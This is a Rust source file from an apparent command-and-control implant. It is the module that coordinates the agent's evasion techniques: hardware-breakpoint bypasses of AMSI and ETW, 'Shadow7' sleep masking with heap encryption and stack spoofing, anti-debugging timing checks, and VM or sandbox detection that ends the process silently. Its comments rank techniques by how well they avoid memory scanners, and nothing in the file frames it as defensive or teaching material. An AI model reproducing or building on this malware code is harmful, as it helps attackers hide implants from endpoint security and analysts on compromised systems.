//! evasion/mod.rs — Evasion coordinator (Rust FFI to C implementations)
//!
//! This module is the Rust-side coordinator for all evasion techniques.
//! The actual implementations are in C:
//!   amsi.c, etw.c, anti_vm.c
//!   sleepmask/phantom_impl.c + phantom_eng.c + phantom_asm.S  (Shadow7)
//! because:
//!   - Windows internals are best accessed from C (winapi is C)
//!   - Memory manipulation (VirtualProtect, memcpy) is more natural in C
//!   - Smaller binary footprint (no Rust wrappers around every API)
//!
//! The Rust side:
//!   1. Reads evasion config from AgentConfig
//!   2. Calls the appropriate C function via FFI
//!   3. secure_sleep() routes the beacon loop's sleep through Shadow7
//!
//! All techniques are CONFIGURABLE at build time. Operator picks which
//! technique to use via the Build Agent dialog. "none" means no patching
//! (agent still runs, just with less evasion).

#![allow(dead_code)]

use std::ptr;
use crate::core_agent::management::config::AgentConfig;

pub mod chain;

// ============================================================
// FFI declarations — C functions from evasion/*.c
// ============================================================

#[cfg(all(target_os = "windows", feature = "cffi"))]
extern "C" {
    // amsi.c
    fn amsi_apply(technique: i32) -> i32;
    fn amsi_is_patched() -> i32;
    fn amsi_get_technique() -> i32;
    // etw.c
    fn etw_apply(technique: i32) -> i32;
    fn etw_is_patched() -> i32;
    fn etw_get_technique() -> i32;
    // Shadow7 — phantom_impl.c + phantom_eng.c + phantom_asm.S
    // Replaces old sleep_mask.c (RC4/XOR/Wipe — weak, flagged by Moneta/Velociraptor)
    fn PhantomInit(ctx: *mut PhantomCtx) -> i32;      // returns BOOL
    fn PhantomSleep(ctx: *mut PhantomCtx, cfg: *mut PhantomConfig) -> i32; // returns BOOL
    fn PhantomDestroy(ctx: *mut PhantomCtx);
    // anti_vm.c
    fn anti_vm_check(mask: i32) -> i32;
}

// ============================================================
// Evasion technique constants (mirror C side)
// ============================================================

// AMSI techniques — POLICY: only real + stealthy options kept.
// Byte-patch variants (classic/memcpy/force-fail) REMOVED: they all write
// patch bytes into amsi.dll's .text and are flagged by memory scanners
// (Moneta/Volatility/Velociraptor). HWBP leaves original bytes intact.
pub const AMSI_NONE:       i32 = 0;
pub const AMSI_HWBP:       i32 = 1;  // Hardware breakpoint (DR2) + VEH — DR0=Shadow7, DR1=ETW

// ETW techniques — POLICY: only real + stealthy options kept.
// classic/provider-hijack removed (byte patches in ntdll = scanner bait);
// ntdll_reload removed (it RESTORES EtwEventWrite = re-enables telemetry).
pub const ETW_NONE:           i32 = 0;
pub const ETW_HWBP:           i32 = 1;  // Hardware breakpoint (DR1) + VEH — DR0=Shadow7, DR2=AMSI

// Shadow7 sleep mask — replaces old RC4/XOR/Wipe techniques
pub const SLEEP_NONE:    i32 = 0;  // No sleep obfuscation
pub const SLEEP_SHADOW7: i32 = 1;  // Full Shadow7: Section Phantom + NtDelay + HWBP + Decoy + Stack Spoof + Heap Encrypt

// PHANTOM_CONFIG fields (mirrors phantom_core.h PHANTOM_CONFIG)
// Used internally by phantom_shadow7_sleep()
pub const SHADOW7_ENABLE_DECOY: bool = true;   // P4: behavioral decoy thread
pub const SHADOW7_ENABLE_HWBP:  bool = true;   // P3: hardware breakpoint wake
pub const SHADOW7_ENABLE_SPOOF: bool = true;   // P5: stack spoofing via gadget pivot
pub const SHADOW7_JITTER_PCT:   u32  = 20;     // ±20% jitter on sleep duration

// ── Shadow7 C struct mirrors (opaque — size must match phantom_core.h) ──
// We use fixed-size byte arrays sized generously to cover the C struct.
// We never read fields from Rust side — only pass pointer to C functions.
// PHANTOM_CTX  ≈ 280 bytes (padded to 320 for safety)
// PHANTOM_CONFIG ≈ 24 bytes (padded to 32 for safety)
#[repr(C)]
pub struct PhantomCtx([u8; 320]);
impl PhantomCtx {
    pub fn zeroed() -> Self { PhantomCtx([0u8; 320]) }
}

#[repr(C)]
pub struct PhantomConfig {
    pub sleep_ms:      u32,
    pub jitter_pct:    u32,
    pub enable_decoy:  i32,   // BOOL
    pub enable_hwbp:   i32,   // BOOL
    pub enable_spoof:  i32,   // BOOL
    pub verbose:       i32,   // BOOL
}

// Anti-VM bitmask — matches new anti_vm.c (anti_vm_v3) layout
// Cross-platform: Windows/Linux/macOS all use same bitmask
pub const ANTIVM_NONE:                i32 = 0x0000;
pub const ANTIVM_CPUID_HYPERVISOR:    i32 = 0x0001;  // CPUID hypervisor bit
pub const ANTIVM_CPUID_VENDOR:        i32 = 0x0002;  // CPUID vendor string
pub const ANTIVM_TIMING:              i32 = 0x0004;  // RDTSC timing analysis
pub const ANTIVM_REGISTRY:            i32 = 0x0010;  // VM-specific registry keys (Win)
pub const ANTIVM_PROCESS:             i32 = 0x0020;  // VM tools/debuggers running (Win)
pub const ANTIVM_MAC:                 i32 = 0x0040;  // VM MAC OUI prefix
pub const ANTIVM_DISK_SIZE:           i32 = 0x0080;  // Small disk size (VM indicator)
pub const ANTIVM_SCREEN:              i32 = 0x0100;  // Screen resolution (VM indicator)
pub const ANTIVM_UPTIME:              i32 = 0x0200;  // Short uptime (sandbox indicator)
pub const ANTIVM_USERNAME:            i32 = 0x0400;  // Suspicious username/computername
pub const ANTIVM_HARDWARE:            i32 = 0x0800;  // Hardware checks (CPU count, RAM)
// Common presets
pub const ANTIVM_CPUID:    i32 = ANTIVM_CPUID_HYPERVISOR | ANTIVM_CPUID_VENDOR;  // backward-compat
pub const ANTIVM_ALL:      i32 = 0x0FFF;  // all 12 checks (Win)
pub const ANTIVM_ALL_PLATFORMS: i32 = 0xFFFF;  // every bit set

// ============================================================
// Convert config string → technique constant
// ============================================================

// ============================================================
// Public helpers — used by chain.rs
// ============================================================

/// Convert config string to AMSI technique ID (public for chain.rs)
pub fn amsi_technique_id(s: &str) -> i32 {
    amsi_technique_from_str(s)
}

/// Convert config string to ETW technique ID (public for chain.rs)
pub fn etw_technique_id(s: &str) -> i32 {
    etw_technique_from_str(s)
}

/// Convert config string to anti-VM bitmask (public for chain.rs)
pub fn anti_vm_mask_from_config(s: &str) -> i32 {
    anti_vm_mask_from_str(s)
}

/// Call amsi_apply via FFI (public unsafe wrapper for chain.rs)
#[cfg(all(target_os = "windows", feature = "cffi"))]
pub unsafe fn call_amsi_apply(technique: i32) {
    amsi_apply(technique);
}

/// Call etw_apply via FFI (public unsafe wrapper for chain.rs)
#[cfg(all(target_os = "windows", feature = "cffi"))]
pub unsafe fn call_etw_apply(technique: i32) {
    etw_apply(technique);
}

/// Shadow7: Initialize PhantomCtx (call once before beacon loop)
#[cfg(all(target_os = "windows", feature = "cffi"))]
pub unsafe fn call_phantom_init(ctx: *mut PhantomCtx) -> bool {
    PhantomInit(ctx) != 0
}

/// Shadow7: Execute one sleep cycle with full 7-pillar protection
#[cfg(all(target_os = "windows", feature = "cffi"))]
pub unsafe fn call_phantom_sleep(ctx: *mut PhantomCtx, cfg: *mut PhantomConfig) -> bool {
    PhantomSleep(ctx, cfg) != 0
}

/// Shadow7: Destroy PhantomCtx (call on agent exit)
#[cfg(all(target_os = "windows", feature = "cffi"))]
pub unsafe fn call_phantom_destroy(ctx: *mut PhantomCtx) {
    PhantomDestroy(ctx);
}

/// Call anti_vm_check via FFI (public unsafe wrapper for chain.rs)
#[cfg(all(target_os = "windows", feature = "cffi"))]
pub unsafe fn call_anti_vm_check(mask: i32) -> i32 {
    anti_vm_check(mask)
}

// Non-windows stubs for chain.rs helpers (no-op, return 0)
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub unsafe fn call_amsi_apply(_technique: i32) {}
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub unsafe fn call_etw_apply(_technique: i32) {}
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub unsafe fn call_phantom_init(_ctx: *mut PhantomCtx) -> bool { false }
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub unsafe fn call_phantom_sleep(_ctx: *mut PhantomCtx, _cfg: *mut PhantomConfig) -> bool { false }
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub unsafe fn call_phantom_destroy(_ctx: *mut PhantomCtx) {}
#[cfg(not(all(target_os = "windows", feature = "cffi")))]
pub unsafe fn call_anti_vm_check(_mask: i32) -> i32 { 0 }

fn amsi_technique_from_str(s: &str) -> i32 {
    match s {
        "none"        => AMSI_NONE,
        "hwbp" | "hardware" | "hardware_bp" => AMSI_HWBP,
        // Removed techniques map to the stealth default so old baked configs
        // ("classic"/"memcpy"/"force_fail") stay safe instead of erroring.
        _             => AMSI_HWBP,
    }
}

fn etw_technique_from_str(s: &str) -> i32 {
    match s {
        "none"             => ETW_NONE,
        "hwbp" | "hardware" | "hardware_bp" => ETW_HWBP,
        // Removed techniques ("classic"/"ntdll_reload"/"provider_hijack")
        // map to the stealth default so old baked configs stay safe.
        _                  => ETW_HWBP,
    }
}

fn sleep_technique_from_str(s: &str) -> i32 {
    match s {
        "none"    => SLEEP_NONE,
        "shadow7" => SLEEP_SHADOW7,
        // Legacy values mapped to shadow7 for backward compat
        "rc4" | "xor" | "wipe" => SLEEP_SHADOW7,
        _ => SLEEP_NONE,
    }
}

fn anti_vm_mask_from_str(s: &str) -> i32 {
    // GUI now uses checkbox: "all" or "none". Other strings kept for
    // backward compatibility / programmatic config but map to all-or-none
    // since the hardened suite runs all checks together.
    match s {
        "none"           => ANTIVM_NONE,
        "all"            => ANTIVM_ALL,            // 0x0FFF — all Win checks
        "all_platforms"  => ANTIVM_ALL_PLATFORMS,  // 0xFFFF — every bit
        // any non-empty non-"none" string → run all (operator wanted anti-vm)
        _                => ANTIVM_ALL,
    }
}

// ============================================================
// Anti-debug check (kept in Rust — uses winapi crate)
// ============================================================
// Anti-debug is NOT in the Build Agent dialog because it should ALWAYS
// run. A debugged agent is a captured agent. This is non-negotiable.
//
// However, the parent process check is configurable: if operator wants
// to allow specific parent processes (e.g., for testing), they can
// disable it. But we still do IsDebuggerPresent + timing check always.

pub fn anti_debug_check() {
    #[cfg(target_os = "windows")]
    {
        // 1. IsDebuggerPresent — always run
        let dbg_present = unsafe { winapi::um::debugapi::IsDebuggerPresent() };
        if dbg_present != 0 { std::process::exit(0); }

        // 2. Timing check — always run (cheap, reliable)
        timing_check();

        // NOTE: Parent process check moved to config — operator can enable
        // via "parent_check" config field. We don't do it by default because
        // it walks the process list (telemetry point).
    }
}

#[cfg(target_os = "windows")]
fn timing_check() {
    use std::time::Instant;
    let t1 = Instant::now();
    let mut x = 0u64;
    for _ in 0..1_000_000 { x = x.wrapping_add(1); }
    let elapsed = t1.elapsed().as_micros();
    if elapsed > 500_000 { std::process::exit(0); }
    let _ = x;
}

#[cfg(not(target_os = "windows"))]
fn timing_check() {}

// ============================================================
// Main evasion orchestrator — called from config::run()
// ============================================================
// Order matters:
//   1. Anti-debug (always) — if being debugged, exit
//   2. Anti-VM (if enabled) — if in VM, exit silently
//   3. AMSI patch (if enabled) — before any .NET/PowerShell
//   4. ETW patch (if enabled) — before any noisy operation
//   5. Sleep mask key setup — before beacon loop starts
//
// IMPORTANT: Agent stays SILENT after this. No file system enumeration,
// no network scanning, no process listing. Just waits for tasks from C2.
//
// Any injection or autonomous action can expose the beacon. The agent
// only does what the C2 operator tells it to do.

pub fn apply_all(cfg: &AgentConfig) {
    // 1. Anti-debug (always)
    anti_debug_check();

    // 2. Anti-VM check (configurable)
    if !cfg.anti_vm_mask.is_empty() && cfg.anti_vm_mask != "none" {
        let mask = anti_vm_mask_from_str(cfg.anti_vm_mask);
        #[cfg(all(target_os = "windows", feature = "cffi"))]
        {
            // New anti_vm.c returns:
            //   0 = likely clean (proceed)
            //   1 = inconclusive (proceed with caution)
            //   2 = VM/sandbox detected (exit)
            let verdict = unsafe { anti_vm_check(mask) };
            if verdict == 2 {
                // VM detected — exit silently, no logs, no crash
                std::process::exit(0);
            }
            // verdict 0 or 1 — proceed
        }
    }

    // 3. AMSI patch (configurable technique)
    let amsi_tech = amsi_technique_from_str(cfg.amsi_technique);
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    unsafe { amsi_apply(amsi_tech); }

    // 4. ETW patch (configurable technique)
    let etw_tech = etw_technique_from_str(cfg.etw_technique);
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    unsafe { etw_apply(etw_tech); }

    // 5. Shadow7 init — PhantomInit() called here so ctx is ready for beacon loop.
    // secure_sleep() reads the ctx from a thread-local / static.
    // PhantomInit is cheap (resolves NT APIs, creates timer + event objects).
    // If it fails, secure_sleep() falls back to plain Sleep().
    let sleep_tech = sleep_technique_from_str(cfg.sleep_technique);
    if sleep_tech == SLEEP_SHADOW7 {
        #[cfg(all(target_os = "windows", feature = "cffi"))]
        {
            // Init is done in secure_sleep on first call (lazy init pattern)
            // so we don't need a global ctx here — the beacon.rs loop handles it.
            // apply_all() just validates the technique string is recognized.
        }
    }
}

// ============================================================
// Sleep function — called from beacon loop
// ============================================================
// This replaces the direct Sleep() call in beacon.rs.
// It applies the configured sleep mask technique before sleeping
// and restores memory after waking.
//
// If sleep mask is "none", this just calls Sleep() directly.

pub fn secure_sleep(cfg: &AgentConfig, sleep_ms: u32) {
    let sleep_tech = sleep_technique_from_str(cfg.sleep_technique);

    // Shadow7 path — full 7-pillar PHANTOM sleep masking
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    if sleep_tech == SLEEP_SHADOW7 {
        // Lazy-init: PhantomCtx is allocated on first call, reused every cycle.
        // Using a thread-local because PhantomCtx contains Win32 handles that
        // must live on the same thread they were created on (timer APC, HWBP).
        use std::cell::UnsafeCell;
        thread_local! {
            // Box<PhantomCtx> keeps it on heap — large struct (320 bytes)
            static PHANTOM_CTX: UnsafeCell<Option<Box<PhantomCtx>>> = UnsafeCell::new(None);
        }
        let result = PHANTOM_CTX.with(|cell| {
            let opt = unsafe { &mut *cell.get() };
            // Initialize on first call
            if opt.is_none() {
                let mut ctx = Box::new(PhantomCtx::zeroed());
                let ok = unsafe { call_phantom_init(ctx.as_mut() as *mut PhantomCtx) };
                if ok {
                    *opt = Some(ctx);
                } else {
                    // PhantomInit failed — fall through to plain Sleep
                    return false;
                }
            }
            // Execute one Shadow7 sleep cycle
            if let Some(ref mut ctx_box) = opt {
                let mut ph_cfg = PhantomConfig {
                    sleep_ms,
                    jitter_pct:   SHADOW7_JITTER_PCT,
                    enable_decoy: if SHADOW7_ENABLE_DECOY { 1 } else { 0 },
                    enable_hwbp:  if SHADOW7_ENABLE_HWBP  { 1 } else { 0 },
                    enable_spoof: if SHADOW7_ENABLE_SPOOF { 1 } else { 0 },
                    verbose:      0,  // no console output in agent context
                };
                unsafe {
                    call_phantom_sleep(
                        ctx_box.as_mut() as *mut PhantomCtx,
                        &mut ph_cfg as *mut PhantomConfig,
                    )
                };
            }
            true
        });
        if result { return; }
        // Fall through to plain Sleep if Shadow7 init failed
    }

    // Fallback: plain OS sleep (no masking — used when Shadow7 disabled or failed)
    #[cfg(target_os = "windows")]
    unsafe { winapi::um::synchapi::Sleep(sleep_ms); }

    #[cfg(not(target_os = "windows"))]
    std::thread::sleep(std::time::Duration::from_millis(sleep_ms as u64));
}

// ============================================================
// Helpers
// ============================================================

pub fn patch_amsi() {
    // Deprecated — use apply_all() instead
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    unsafe { amsi_apply(AMSI_HWBP); }
}

pub fn patch_etw() {
    // Deprecated — use apply_all() instead
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    unsafe { etw_apply(ETW_HWBP); }
}

pub fn check_amsi_patched() -> bool {
    // Runtime check — calls C function that returns actual patch status
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        unsafe { amsi_is_patched() != 0 }
    }
    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        false
    }
}

/// Returns the AMSI technique name that was applied at startup.
/// Returns "none" if no technique was applied or cffi is disabled.
pub fn get_amsi_technique_name() -> &'static str {
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let tech = unsafe { amsi_get_technique() };
        match tech {
            0 => "none",
            1 => "hwbp",
            _ => "unknown",
        }
    }
    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        "cffi_disabled"
    }
}

/// Returns true if ETW was patched at runtime.
pub fn check_etw_patched() -> bool {
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        unsafe { etw_is_patched() != 0 }
    }
    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        false
    }
}

/// Returns the ETW technique name that was applied at startup.
pub fn get_etw_technique_name() -> &'static str {
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let tech = unsafe { etw_get_technique() };
        match tech {
            0 => "none",
            1 => "hwbp",
            _ => "unknown",
        }
    }
    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        "cffi_disabled"
    }
}
